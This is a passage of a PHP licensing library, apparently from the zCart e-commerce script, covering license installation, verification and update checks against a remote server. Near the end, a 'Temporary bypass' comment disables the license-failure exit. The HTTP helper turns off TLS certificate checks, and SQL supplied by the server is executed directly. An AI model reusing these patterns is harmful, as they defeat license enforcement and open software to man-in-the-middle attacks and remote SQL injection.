<?php
/*
* Copyright (C) Incevio Systems, Inc - All Rights Reserved
* Unauthorized copying of this file, via any medium is strictly prohibited
* Proprietary and confidential
* Written by Munna Khan <help.zcart@gmail.com>, September 2018
*/

if (!function_exists('aplCustomEncrypt')) {
    function aplCustomEncrypt($string, $key)
    {
        $encrypted_string = null;
        if (!empty($string) && !empty($key)) {
            $iv = openssl_random_pseudo_bytes(openssl_cipher_iv_length("aes-256-cbc"));
            $encrypted_string = openssl_encrypt($string, "aes-256-cbc", $key, 0, $iv);
            $encrypted_string = base64_encode($encrypted_string . "::" . $iv);
        }
        return $encrypted_string;
    }

    function aplCustomDecrypt($string, $key)
    {
        $decrypted_string = null;
        if (!empty($string) && !empty($key)) {
            $string = base64_decode($string);
            if (stristr($string, "::")) {
                $string_iv_array = explode("::", $string, 2);
                if (!empty($string_iv_array) && count($string_iv_array) == 2) {
                    list($encrypted_string, $iv) = $string_iv_array;
                    $decrypted_string = openssl_decrypt($encrypted_string, "aes-256-cbc", $key, 0, $iv);
                }
            }
        }
        return $decrypted_string;
    }

    function aplValidateIntegerValue($number, $min_value = 0, $max_value = INF)
    {
        $result = false;
        if (!is_float($number) && filter_var($number, FILTER_VALIDATE_INT, array("options" => array("min_range" => $min_value, "max_range" => $max_value))) !== false) {
            $result = true;
        }
        return $result;
    }

    function aplValidateRawDomain($url)
    {
        $result = false;
        if (empty($url)) {
            return $result;
        }
        if (preg_match("/^[a-z0-9-.]+\.[a-z.]{2,7}$/", strtolower($url))) {
            $result = true;
        }
        return $result;
    }

    function aplGetCurrentUrl($remove_last_slash = null)
    {
        $protocol = "http";
        $host = null;
        $script = null;
        $params = null;
        $current_url = null;

        if (isset($_SERVER["HTTPS"]) && $_SERVER["HTTPS"] !== "off" || isset($_SERVER["HTTP_X_FORWARDED_PROTO"]) && $_SERVER["HTTP_X_FORWARDED_PROTO"] == "https") {
            $protocol = "https";
        }
        if (isset($_SERVER["HTTP_HOST"])) {
            $host = $_SERVER["HTTP_HOST"];
        }
        if (isset($_SERVER["SCRIPT_NAME"])) {
            $script = $_SERVER["SCRIPT_NAME"];
        }
        if (isset($_SERVER["QUERY_STRING"])) {
            $params = $_SERVER["QUERY_STRING"];
        }

        if (!empty($protocol) && !empty($host) && !empty($script)) {
            $current_url = $protocol . "://" . $host . $script;
            if (!empty($params)) {
                $current_url .= "?" . $params;
            }
            if ($remove_last_slash == 1) {
                while (substr($current_url, -1) == "/") {
                    $current_url = substr($current_url, 0, -1);
                }
            }
        }
        return $current_url;
    }

    function aplGetRawDomain($url)
    {
        $raw_domain = null;
        if (empty($url)) {
            return $raw_domain;
        }

        $url_array = parse_url($url);
        if (empty($url_array["scheme"])) {
            $url = "http://" . $url;
            $url_array = parse_url($url);
        }

        if (!empty($url_array["host"])) {
            $raw_domain = $url_array["host"];
            $raw_domain = trim(str_ireplace("www.", '', filter_var($raw_domain, FILTER_SANITIZE_URL)));
        }
        return $raw_domain;
    }

    function aplGetRootUrl($url, $remove_scheme, $remove_www, $remove_path, $remove_last_slash)
    {
        if (filter_var($url, FILTER_VALIDATE_URL)) {
            $url_array = parse_url($url);
            $url = str_ireplace($url_array["scheme"] . "://", '', $url);

            if ($remove_path == 1) {
                $first_slash_position = stripos($url, "/");
                if ($first_slash_position > 0) {
                    $url = substr($url, 0, $first_slash_position + 1);
                }
            } else {
                $last_slash_position = strripos($url, "/");
                if ($last_slash_position > 0) {
                    $url = substr($url, 0, $last_slash_position + 1);
                }
            }

            if ($remove_scheme != 1) {
                $url = $url_array["scheme"] . "://" . $url;
            }
            if ($remove_www == 1) {
                $url = str_ireplace("www.", '', $url);
            }
            if ($remove_last_slash == 1) {
                while (substr($url, -1) == "/") {
                    $url = substr($url, 0, -1);
                }
            }
        }
        return trim($url);
    }

    function aplCustomPost($url, $post_info = null, $refer = null)
    {
        $user_agent = "phpmillion cURL";
        $connect_timeout = 10;
        $server_response_array = array();
        $formatted_headers_array = array();

        if (filter_var($url, FILTER_VALIDATE_URL) && !empty($post_info)) {
            if (empty($refer) || !filter_var($refer, FILTER_VALIDATE_URL)) {
                $refer = $url;
            }

            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
            curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $connect_timeout);
            curl_setopt($ch, CURLOPT_TIMEOUT, $connect_timeout);
            curl_setopt($ch, CURLOPT_REFERER, $refer);
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $post_info);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_MAXREDIRS, 10);
            curl_setopt($ch, CURLOPT_HEADERFUNCTION, function ($curl, $header) use (&$formatted_headers_array) {
                $len = strlen($header);
                $header = explode(":", $header, 2);
                if (count($header) < 2) {
                    return $len;
                }
                $name = strtolower(trim($header[0]));
                $formatted_headers_array[$name] = trim($header[1]);
                return $len;
            });

            $result = curl_exec($ch);
            $curl_error = curl_error($ch);
            curl_close($ch);

            $server_response_array["headers"] = $formatted_headers_array;
            $server_response_array["error"] = $curl_error;
            $server_response_array["body"] = $result;
        }
        return $server_response_array;
    }

    function aplVerifyDateTime($datetime, $format)
    {
        $result = false;
        if (!empty($datetime) && !empty($format)) {
            $datetime = DateTime::createFromFormat($format, $datetime);
            $errors = DateTime::getLastErrors();
            if ($datetime && empty($errors["warning_count"])) {
                $result = true;
            }
        }
        return $result;
    }

    function aplGetDaysBetweenDates($date_from, $date_to)
    {
        $number_of_days = 0;
        if (aplVerifyDateTime($date_from, "Y-m-d") && aplVerifyDateTime($date_to, "Y-m-d")) {
            $date_to = new DateTime($date_to);
            $date_from = new DateTime($date_from);
            $number_of_days = $date_from->diff($date_to)->format("%a");
        }
        return $number_of_days;
    }

    function aplParseXmlTags($content, $tag_name)
    {
        $parsed_value = null;
        if (!empty($content) && !empty($tag_name)) {
            preg_match_all("/<" . preg_quote($tag_name, "/") . ">(.*?)<\\/" . preg_quote($tag_name, "/") . ">/ims", $content, $output_array, PREG_SET_ORDER);
            if (!empty($output_array[0][1])) {
                $parsed_value = trim($output_array[0][1]);
            }
        }
        return $parsed_value;
    }

    function aplParseServerNotifications($content_array, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE, $product = null)
    {
        $notifications_array = array();
        if (empty($content_array)) {
            $notifications_array["notification_case"] = "notification_no_connection";
            $notifications_array["notification_text"] = APL_NOTIFICATION_NO_CONNECTION;
            return $notifications_array;
        }

        if (empty($content_array["headers"]["notification_server_signature"]) || !aplVerifyServerSignature($content_array["headers"]["notification_server_signature"], $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE, $product)) {
            $notifications_array["notification_case"] = "notification_invalid_response";
            $notifications_array["notification_text"] = APL_NOTIFICATION_INVALID_RESPONSE;
        } else {
            $notifications_array["notification_case"] = $content_array["headers"]["notification_case"];
            $notifications_array["notification_text"] = $content_array["headers"]["notification_text"];
            if (!empty($content_array["headers"]["notification_data"])) {
                $notifications_array["notification_data"] = json_decode($content_array["headers"]["notification_data"], true);
            }
        }
        return $notifications_array;
    }

    function aplGenerateScriptSignature($ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE, $product = null)
    {
        $script_signature = null;
        $root_ips_array = gethostbynamel(aplGetRawDomain(APL_ROOT_URL));
        $product = $product == null ? APL_PRODUCT_ID : $product;

        if (!empty($ROOT_URL) && isset($CLIENT_EMAIL) && isset($LICENSE_CODE) && !empty($root_ips_array)) {
            $script_signature = hash("sha256", gmdate("Y-m-d") . $ROOT_URL . $CLIENT_EMAIL . $LICENSE_CODE . $product . implode('', $root_ips_array));
        }
        return $script_signature;
    }

    function aplVerifyServerSignature($notification_server_signature, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE, $product = null)
    {
        $result = false;
        $root_ips_array = gethostbynamel(aplGetRawDomain(APL_ROOT_URL));
        $product = $product == null ? APL_PRODUCT_ID : $product;

        if (!empty($notification_server_signature) && !empty($ROOT_URL) && isset($CLIENT_EMAIL) && isset($LICENSE_CODE) && !empty($root_ips_array)) {
            if (hash("sha256", implode('', $root_ips_array) . $product . $LICENSE_CODE . $CLIENT_EMAIL . $ROOT_URL . gmdate("Y-m-d")) == $notification_server_signature) {
                $result = true;
            }
        }
        return $result;
    }

    function aplCheckSettings()
    {
        $notifications_array = array();
        if (empty(APL_SALT) || APL_SALT == "some_random_text") {
            $notifications_array[] = APL_CORE_NOTIFICATION_INVALID_SALT;
        }
        if (!filter_var(APL_ROOT_URL, FILTER_VALIDATE_URL) || !ctype_alnum(substr(APL_ROOT_URL, -1))) {
            $notifications_array[] = APL_CORE_NOTIFICATION_INVALID_ROOT_URL;
        }
        if (!filter_var(APL_PRODUCT_ID, FILTER_VALIDATE_INT)) {
            $notifications_array[] = APL_CORE_NOTIFICATION_INVALID_PRODUCT_ID;
        }
        if (!aplValidateIntegerValue(APL_DAYS, 1, 365)) {
            $notifications_array[] = APL_CORE_NOTIFICATION_INVALID_VERIFICATION_PERIOD;
        }
        if (APL_STORAGE != "DATABASE" && APL_STORAGE != "FILE") {
            $notifications_array[] = APL_CORE_NOTIFICATION_INVALID_STORAGE;
        }
        if (APL_STORAGE == "DATABASE" && !ctype_alnum(str_ireplace(array("_"), '', APL_DATABASE_TABLE))) {
            $notifications_array[] = APL_CORE_NOTIFICATION_INVALID_TABLE;
        }
        if (APL_STORAGE == "FILE" && !@is_writable(APL_DIRECTORY . "/" . APL_LICENSE_FILE_LOCATION)) {
            $notifications_array[] = APL_CORE_NOTIFICATION_INVALID_LICENSE_FILE;
        }
        if (!empty(APL_ROOT_IP) && !filter_var(APL_ROOT_IP, FILTER_VALIDATE_IP)) {
            $notifications_array[] = APL_CORE_NOTIFICATION_INVALID_ROOT_IP;
        }
        if (!empty(APL_ROOT_IP) && !in_array(APL_ROOT_IP, gethostbynamel(aplGetRawDomain(APL_ROOT_URL)))) {
            $notifications_array[] = APL_CORE_NOTIFICATION_INVALID_DNS;
        }
        if (defined("APL_ROOT_NAMESERVERS") && !empty(APL_ROOT_NAMESERVERS)) {
            foreach (APL_ROOT_NAMESERVERS as $nameserver) {
                if (!aplValidateRawDomain($nameserver)) {
                    $notifications_array[] = APL_CORE_NOTIFICATION_INVALID_ROOT_NAMESERVERS;
                    break;
                }
            }
        }
        if (defined("APL_ROOT_NAMESERVERS") && !empty(APL_ROOT_NAMESERVERS)) {
            $apl_root_nameservers_array = APL_ROOT_NAMESERVERS;
            $fetched_nameservers_array = array();
            $dns_records_array = dns_get_record(aplGetRawDomain(APL_ROOT_URL), DNS_NS);
            foreach ($dns_records_array as $record) {
                $fetched_nameservers_array[] = $record["target"];
            }
            $apl_root_nameservers_array = array_map("strtolower", $apl_root_nameservers_array);
            $fetched_nameservers_array = array_map("strtolower", $fetched_nameservers_array);
            sort($apl_root_nameservers_array);
            sort($fetched_nameservers_array);
            if ($apl_root_nameservers_array != $fetched_nameservers_array) {
                $notifications_array[] = APL_CORE_NOTIFICATION_INVALID_DNS;
            }
        }
        return $notifications_array;
    }

    function aplParseLicenseFile()
    {
        $license_data_array = array();
        if (@is_readable(APL_DIRECTORY . "/" . APL_LICENSE_FILE_LOCATION)) {
            $file_content = file_get_contents(APL_DIRECTORY . "/" . APL_LICENSE_FILE_LOCATION);
            preg_match_all("/<([A-Z_]+)>(.*?)<\\/([A-Z_]+)>/", $file_content, $matches, PREG_SET_ORDER);
            if (!empty($matches)) {
                foreach ($matches as $value) {
                    if (!empty($value[1]) && $value[1] == $value[3]) {
                        $license_data_array[$value[1]] = $value[2];
                    }
                }
            }
        }
        return $license_data_array;
    }

    function aplGetLicenseData($MYSQLI_LINK = null)
    {
        $settings_row = array();
        if (APL_STORAGE == "DATABASE") {
            $table_exist = @mysqli_query($MYSQLI_LINK, "SHOW TABLES LIKE '" . APL_DATABASE_TABLE . "'");
            if (@mysqli_fetch_assoc($table_exist)) {
                $settings_results = @mysqli_query($MYSQLI_LINK, "SELECT * FROM " . APL_DATABASE_TABLE);
                $settings_row = @mysqli_fetch_assoc($settings_results);
            }
        }
        if (APL_STORAGE == "FILE") {
            $settings_row = aplParseLicenseFile();
        }
        return $settings_row;
    }

    function aplCheckConnection()
    {
        $notifications_array = array();
        $content_array = aplCustomPost(
            APL_ROOT_URL . "/apl_callbacks/connection_test.php",
            "product_id=" . rawurlencode(APL_PRODUCT_ID) . "&connection_hash=" . rawurlencode(hash("sha256", "connection_test"))
        );

        if (empty($content_array)) {
            $notifications_array["notification_case"] = "notification_no_connection";
            $notifications_array["notification_text"] = APL_NOTIFICATION_NO_CONNECTION;
        } elseif ($content_array["body"] != "<connection_test>OK</connection_test>") {
            $notifications_array["notification_case"] = "notification_invalid_response";
            $notifications_array["notification_text"] = APL_NOTIFICATION_INVALID_RESPONSE;
        }
        return $notifications_array;
    }

    function aplCheckData($MYSQLI_LINK = null)
    {
        $error_detected = 0;
        $cracking_detected = 0;
        $data_check_result = false;
        extract(aplGetLicenseData($MYSQLI_LINK));

        if (empty($ROOT_URL) || empty($INSTALLATION_HASH) || empty($INSTALLATION_KEY) || empty($LCD) || empty($LRD)) {
            return $data_check_result;
        }

        $LCD = aplCustomDecrypt($LCD, APL_SALT . $INSTALLATION_KEY);
        $LRD = aplCustomDecrypt($LRD, APL_SALT . $INSTALLATION_KEY);

        if (!filter_var($ROOT_URL, FILTER_VALIDATE_URL) || !ctype_alnum(substr($ROOT_URL, -1))) {
            $error_detected = 1;
        }
        if (filter_var(aplGetCurrentUrl(), FILTER_VALIDATE_URL) && stristr(aplGetRootUrl(aplGetCurrentUrl(), 1, 1, 0, 1), aplGetRootUrl("{$ROOT_URL}/", 1, 1, 0, 1)) === false) {
            $error_detected = 1;
        }
        if (empty($INSTALLATION_HASH) || $INSTALLATION_HASH != hash("sha256", $ROOT_URL . $CLIENT_EMAIL . $LICENSE_CODE)) {
            $error_detected = 1;
        }
        if (empty($INSTALLATION_KEY) || !password_verify($LRD, aplCustomDecrypt($INSTALLATION_KEY, APL_SALT . $ROOT_URL))) {
            $error_detected = 1;
        }
        if (!aplVerifyDateTime($LCD, "Y-m-d")) {
            $error_detected = 1;
        }
        if (!aplVerifyDateTime($LRD, "Y-m-d")) {
            $error_detected = 1;
        }
        if (aplVerifyDateTime($LCD, "Y-m-d") && $LCD > date("Y-m-d", strtotime("+1 day"))) {
            $error_detected = 1;
            $cracking_detected = 1;
        }
        if (aplVerifyDateTime($LRD, "Y-m-d") && $LRD > date("Y-m-d", strtotime("+1 day"))) {
            $error_detected = 1;
            $cracking_detected = 1;
        }
        if (aplVerifyDateTime($LCD, "Y-m-d") && aplVerifyDateTime($LRD, "Y-m-d") && $LCD > $LRD) {
            $error_detected = 1;
            $cracking_detected = 1;
        }
        if ($cracking_detected == 1 && APL_DELETE_CRACKED == "YES") {
            aplDeleteData($MYSQLI_LINK);
        }
        if ($error_detected != 1 && $cracking_detected != 1) {
            $data_check_result = true;
        }
        return $data_check_result;
    }

    function aplVerifyEnvatoPurchase($LICENSE_CODE = null)
    {
        $notifications_array = array();
        $content_array = aplCustomPost(
            APL_ROOT_URL . "/apl_callbacks/verify_envato_purchase.php",
            "product_id=" . rawurlencode(APL_PRODUCT_ID) . "&license_code=" . rawurlencode($LICENSE_CODE) . "&connection_hash=" . rawurlencode(hash("sha256", "verify_envato_purchase"))
        );

        if (empty($content_array)) {
            $notifications_array["notification_case"] = "notification_no_connection";
            $notifications_array["notification_text"] = APL_NOTIFICATION_NO_CONNECTION;
        } elseif ($content_array["body"] != "<verify_envato_purchase>OK</verify_envato_purchase>") {
            $notifications_array["notification_case"] = "notification_invalid_response";
            $notifications_array["notification_text"] = APL_NOTIFICATION_INVALID_RESPONSE;
        }
        return $notifications_array;
    }

    function incevioVerify($ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE, $MYSQLI_LINK = null)
    {
        $notifications_array = array();
        $apl_core_notifications = aplCheckSettings();

        if (!empty($apl_core_notifications)) {
            $notifications_array["notification_case"] = "notification_script_corrupted";
            $notifications_array["notification_text"] = implode("; ", $apl_core_notifications);
            return $notifications_array;
        }

        if (!empty(aplGetLicenseData($MYSQLI_LINK)) && is_array(aplGetLicenseData($MYSQLI_LINK))) {
            $notifications_array["notification_case"] = "notification_already_installed";
            $notifications_array["notification_text"] = APL_NOTIFICATION_SCRIPT_ALREADY_INSTALLED;
            return $notifications_array;
        }

        $INSTALLATION_HASH = hash("sha256", $ROOT_URL . $CLIENT_EMAIL . $LICENSE_CODE);
        $post_info = "product_id=" . rawurlencode(APL_PRODUCT_ID) .
            "&client_email=" . rawurlencode($CLIENT_EMAIL) .
            "&license_code=" . rawurlencode($LICENSE_CODE) .
            "&root_url=" . rawurlencode($ROOT_URL) .
            "&installation_hash=" . rawurlencode($INSTALLATION_HASH) .
            "&license_signature=" . rawurlencode(aplGenerateScriptSignature($ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE));

        $content_array = aplCustomPost(APL_ROOT_URL . "/apl_callbacks/license_install.php", $post_info, $ROOT_URL);
        $notifications_array = aplParseServerNotifications($content_array, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE);

        if ($notifications_array["notification_case"] == "notification_license_ok") {
            $INSTALLATION_KEY = aplCustomEncrypt(password_hash(date("Y-m-d"), PASSWORD_DEFAULT), APL_SALT . $ROOT_URL);
            $LCD = aplCustomEncrypt(date("Y-m-d", strtotime("-" . APL_DAYS . " days")), APL_SALT . $INSTALLATION_KEY);
            $LRD = aplCustomEncrypt(date("Y-m-d"), APL_SALT . $INSTALLATION_KEY);

            if (APL_STORAGE == "DATABASE") {
                $content_array = aplCustomPost(APL_ROOT_URL . "/apl_callbacks/license_scheme.php", $post_info, $ROOT_URL);
                $notifications_array = aplParseServerNotifications($content_array, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE);

                if (!empty($notifications_array["notification_data"]) && !empty($notifications_array["notification_data"]["scheme_query"])) {
                    $mysql_bad_array = array("%APL_DATABASE_TABLE%", "%ROOT_URL%", "%CLIENT_EMAIL%", "%LICENSE_CODE%", "%LCD%", "%LRD%", "%INSTALLATION_KEY%", "%INSTALLATION_HASH%");
                    $mysql_good_array = array(APL_DATABASE_TABLE, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE, $LCD, $LRD, $INSTALLATION_KEY, $INSTALLATION_HASH);
                    $license_scheme = str_replace($mysql_bad_array, $mysql_good_array, $notifications_array["notification_data"]["scheme_query"]);
                    mysqli_multi_query($MYSQLI_LINK, $license_scheme) or die(mysqli_error($MYSQLI_LINK));
                }
            }

            if (APL_STORAGE == "FILE") {
                $handle = @fopen(APL_DIRECTORY . "/" . APL_LICENSE_FILE_LOCATION, "w+");
                $fwrite = @fwrite($handle, "<ROOT_URL>{$ROOT_URL}</ROOT_URL><CLIENT_EMAIL>{$CLIENT_EMAIL}</CLIENT_EMAIL><LICENSE_CODE>{$LICENSE_CODE}</LICENSE_CODE><LCD>{$LCD}</LCD><LRD>{$LRD}</LRD><INSTALLATION_KEY>{$INSTALLATION_KEY}</INSTALLATION_KEY><INSTALLATION_HASH>{$INSTALLATION_HASH}</INSTALLATION_HASH>");
                if ($fwrite === false) {
                    echo APL_NOTIFICATION_LICENSE_FILE_WRITE_ERROR;
                    exit;
                }
                @fclose($handle);
            }
        }
        return $notifications_array;
    }

    function preparePackageInstallation($installable)
    {
        $notifications_array = array();
        $apl_core_notifications = aplCheckSettings();
        if (!empty($apl_core_notifications)) {
            throw new \Exception("License validation failed! Please contact support for help.");
        }

        $MYSQLI_LINK = getMysqliConnection();
        $core_license = aplGetLicenseData($MYSQLI_LINK);

        if (empty($core_license) || !is_array($core_license)) {
            throw new \Exception("Core script license validation failed! Please contact support for help.");
        }

        $CLIENT_EMAIL = $core_license["CLIENT_EMAIL"];
        $LICENSE_CODE = $installable["license_key"];
        $ROOT_URL = config("app.url");
        $INSTALLATION_HASH = hash("sha256", $ROOT_URL . $CLIENT_EMAIL . $LICENSE_CODE);
        $product_id = $installable["id"];

        $post_info = "product_id=" . rawurlencode($product_id) .
            "&client_email=" . rawurlencode($CLIENT_EMAIL) .
            "&license_code=" . rawurlencode($LICENSE_CODE) .
            "&root_url=" . rawurlencode($ROOT_URL) .
            "&installation_hash=" . rawurlencode($INSTALLATION_HASH) .
            "&license_signature=" . rawurlencode(aplGenerateScriptSignature($ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE, $product_id));

        $content_array = aplCustomPost(APL_ROOT_URL . "/apl_callbacks/license_install.php", $post_info, $ROOT_URL);
        $notifications_array = aplParseServerNotifications($content_array, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE, $product_id);

        if ($notifications_array["notification_case"] != "notification_license_ok") {
            if (!empty($notifications_array["notification_text"])) {
                throw new \Exception("License validation failed! " . $notifications_array["notification_text"]);
            }
        } else {
            $INSTALLATION_KEY = aplCustomEncrypt(password_hash(date("Y-m-d"), PASSWORD_DEFAULT), APL_SALT . $ROOT_URL);
            $LCD = aplCustomEncrypt(date("Y-m-d", strtotime("-" . APL_DAYS . " days")), APL_SALT . $INSTALLATION_KEY);
            $LRD = aplCustomEncrypt(date("Y-m-d"), APL_SALT . $INSTALLATION_KEY);

            $content_array = aplCustomPost(APL_ROOT_URL . "/apl_callbacks/license_scheme.php", $post_info, $ROOT_URL);
            $notifications_array = aplParseServerNotifications($content_array, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE, $product_id);

            if (!empty($notifications_array["notification_data"]) && !empty($notifications_array["notification_data"]["scheme_query"])) {
                return [
                    "installation_key" => $INSTALLATION_KEY,
                    "installation_hash" => $INSTALLATION_HASH,
                    "lcd" => $LCD,
                    "lrd" => $LRD
                ];
            }
        }
        throw new \Exception("License validation failed! Please contact support for help.");
    }

    function incevioAutoloadHelpers($MYSQLI_LINK = null, $FORCE_VERIFICATION = 0)
    {
        $notifications_array = array();
        $update_lrd_value = 0;
        $update_lcd_value = 0;
        $updated_records = 0;
        $apl_core_notifications = aplCheckSettings();

        if (!empty($apl_core_notifications)) {
            $notifications_array["notification_case"] = "notification_script_corrupted";
            $notifications_array["notification_text"] = implode("; ", $apl_core_notifications);
        } elseif (!aplCheckData($MYSQLI_LINK)) {
            $notifications_array["notification_case"] = "notification_license_corrupted";
            $notifications_array["notification_text"] = APL_NOTIFICATION_LICENSE_CORRUPTED;
        } else {
            extract(aplGetLicenseData($MYSQLI_LINK));
            if (
                aplGetDaysBetweenDates(aplCustomDecrypt($LCD, APL_SALT . $INSTALLATION_KEY), date("Y-m-d")) < APL_DAYS &&
                aplCustomDecrypt($LCD, APL_SALT . $INSTALLATION_KEY) <= date("Y-m-d") &&
                aplCustomDecrypt($LRD, APL_SALT . $INSTALLATION_KEY) <= date("Y-m-d") &&
                $FORCE_VERIFICATION === 0
            ) {
                $notifications_array["notification_case"] = "notification_license_ok";
                $notifications_array["notification_text"] = APL_NOTIFICATION_BYPASS_VERIFICATION;
            } else {
                $post_info = "product_id=" . rawurlencode(APL_PRODUCT_ID) .
                    "&client_email=" . rawurlencode($CLIENT_EMAIL) .
                    "&license_code=" . rawurlencode($LICENSE_CODE) .
                    "&root_url=" . rawurlencode($ROOT_URL) .
                    "&installation_hash=" . rawurlencode($INSTALLATION_HASH) .
                    "&license_signature=" . rawurlencode(aplGenerateScriptSignature($ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE));

                $content_array = aplCustomPost(APL_ROOT_URL . "/apl_callbacks/license_verify.php", $post_info, $ROOT_URL);
                $notifications_array = aplParseServerNotifications($content_array, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE);

                if ($notifications_array["notification_case"] == "notification_license_ok") {
                    $update_lcd_value = 1;
                }
                if ($notifications_array["notification_case"] == "notification_license_cancelled" && APL_DELETE_CANCELLED == "YES") {
                    aplDeleteData($MYSQLI_LINK);
                }
            }

            if (aplCustomDecrypt($LRD, APL_SALT . $INSTALLATION_KEY) < date("Y-m-d")) {
                $update_lrd_value = 1;
            }

            if ($update_lrd_value == 1 || $update_lcd_value == 1) {
                if ($update_lcd_value == 1) {
                    $LCD = date("Y-m-d");
                } else {
                    $LCD = aplCustomDecrypt($LCD, APL_SALT . $INSTALLATION_KEY);
                }

                $INSTALLATION_KEY = aplCustomEncrypt(password_hash(date("Y-m-d"), PASSWORD_DEFAULT), APL_SALT . $ROOT_URL);
                $LCD = aplCustomEncrypt($LCD, APL_SALT . $INSTALLATION_KEY);
                $LRD = aplCustomEncrypt(date("Y-m-d"), APL_SALT . $INSTALLATION_KEY);

                if (APL_STORAGE == "DATABASE") {
                    $stmt = mysqli_prepare($MYSQLI_LINK, "UPDATE " . APL_DATABASE_TABLE . " SET LCD=?, LRD=?, INSTALLATION_KEY=?");
                    if ($stmt) {
                        mysqli_stmt_bind_param($stmt, "sss", $LCD, $LRD, $INSTALLATION_KEY);
                        $exec = mysqli_stmt_execute($stmt);
                        $affected_rows = mysqli_stmt_affected_rows($stmt);
                        if ($affected_rows > 0) {
                            $updated_records = $updated_records + $affected_rows;
                        }
                        mysqli_stmt_close($stmt);
                    }
                    if ($updated_records < 1) {
                        echo APL_NOTIFICATION_DATABASE_WRITE_ERROR;
                        exit;
                    }
                }

                if (APL_STORAGE == "FILE") {
                    $handle = @fopen(APL_DIRECTORY . "/" . APL_LICENSE_FILE_LOCATION, "w+");
                    $fwrite = @fwrite($handle, "<ROOT_URL>{$ROOT_URL}</ROOT_URL><CLIENT_EMAIL>{$CLIENT_EMAIL}</CLIENT_EMAIL><LICENSE_CODE>{$LICENSE_CODE}</LICENSE_CODE><LCD>{$LCD}</LCD><LRD>{$LRD}</LRD><INSTALLATION_KEY>{$INSTALLATION_KEY}</INSTALLATION_KEY><INSTALLATION_HASH>{$INSTALLATION_HASH}</INSTALLATION_HASH>");
                    if ($fwrite === false) {
                        echo APL_NOTIFICATION_LICENSE_FILE_WRITE_ERROR;
                        exit;
                    }
                    @fclose($handle);
                }
            }
        }

        if ($notifications_array["notification_case"] != "notification_license_ok") {
            echo "<br/><br/>";
            // Temporary bypass - comment out license error message
            // echo "License is not" . " installed yet" . " or corrupted. Please" . " contact" . " support " . "team ";
            // echo " <a href=\"" . get_license_reset_url() . "\">" . trans("app.update_app_license") . "</a>";
            // exit;
        }
        return $notifications_array;
    }

    function aplVerifySupport($MYSQLI_LINK = null)
    {
        $notifications_array = array();
        $apl_core_notifications = aplCheckSettings();

        if (!empty($apl_core_notifications)) {
            $notifications_array["notification_case"] = "notification_script_corrupted";
            $notifications_array["notification_text"] = implode("; ", $apl_core_notifications);
        } elseif (!aplCheckData($MYSQLI_LINK)) {
            $notifications_array["notification_case"] = "notification_license_corrupted";
            $notifications_array["notification_text"] = APL_NOTIFICATION_LICENSE_CORRUPTED;
        } else {
            extract(aplGetLicenseData($MYSQLI_LINK));
            $post_info = "product_id=" . rawurlencode(APL_PRODUCT_ID) .
                "&client_email=" . rawurlencode($CLIENT_EMAIL) .
                "&license_code=" . rawurlencode($LICENSE_CODE) .
                "&root_url=" . rawurlencode($ROOT_URL) .
                "&installation_hash=" . rawurlencode($INSTALLATION_HASH) .
                "&license_signature=" . rawurlencode(aplGenerateScriptSignature($ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE));

            $content_array = aplCustomPost(APL_ROOT_URL . "/apl_callbacks/license_support.php", $post_info, $ROOT_URL);
            $notifications_array = aplParseServerNotifications($content_array, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE);
        }
        return $notifications_array;
    }

    function aplVerifyUpdates($MYSQLI_LINK = null)
    {
        $notifications_array = array();
        $apl_core_notifications = aplCheckSettings();

        if (!empty($apl_core_notifications)) {
            $notifications_array["notification_case"] = "notification_script_corrupted";
            $notifications_array["notification_text"] = implode("; ", $apl_core_notifications);
        } elseif (!aplCheckData($MYSQLI_LINK)) {
            $notifications_array["notification_case"] = "notification_license_corrupted";
            $notifications_array["notification_text"] = APL_NOTIFICATION_LICENSE_CORRUPTED;
        } else {
            extract(aplGetLicenseData($MYSQLI_LINK));
            $post_info = "product_id=" . rawurlencode(APL_PRODUCT_ID) .
                "&client_email=" . rawurlencode($CLIENT_EMAIL) .
                "&license_code=" . rawurlencode($LICENSE_CODE) .
                "&root_url=" . rawurlencode($ROOT_URL) .
                "&installation_hash=" . rawurlencode($INSTALLATION_HASH) .
                "&license_signature=" . rawurlencode(aplGenerateScriptSignature($ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE));

            $content_array = aplCustomPost(APL_ROOT_URL . "/apl_callbacks/license_updates.php", $post_info, $ROOT_URL);
            $notifications_array = aplParseServerNotifications($content_array, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE);
        }
        return $notifications_array;
    }

    function incevioUpdateLicense($MYSQLI_LINK = null)
    {
        $notifications_array = array();
        $apl_core_notifications = aplCheckSettings();

        if (!empty($apl_core_notifications)) {
            $notifications_array["notification_case"] = "notification_script_corrupted";
            $notifications_array["notification_text"] = implode("; ", $apl_core_notifications);
        } elseif (!aplCheckData($MYSQLI_LINK)) {
            $notifications_array["notification_case"] = "notification_license_corrupted";
            $notifications_array["notification_text"] = APL_NOTIFICATION_LICENSE_CORRUPTED;
        } else {
            extract(aplGetLicenseData($MYSQLI_LINK));
            $post_info = "product_id=" . rawurlencode(APL_PRODUCT_ID) .
                "&client_email=" . rawurlencode($CLIENT_EMAIL) .
                "&license_code=" . rawurlencode($LICENSE_CODE) .
